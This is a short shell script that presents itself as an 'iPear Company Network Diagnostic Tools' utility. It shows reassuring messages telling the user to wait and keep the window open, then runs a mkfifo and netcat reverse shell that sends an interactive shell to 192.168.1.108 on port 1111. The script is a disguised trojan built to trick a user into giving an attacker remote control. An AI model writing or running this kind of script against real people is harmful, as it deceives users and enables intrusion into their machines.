#!/bin/sh

echo "***** Welcome to iPear Company Network Diagnostic Tools *****\n"
sleep 2
echo "Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins."
echo "Reminder: Dont close this window! Your network will be slow again if you do so!"
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.108 1111 >/tmp/f 

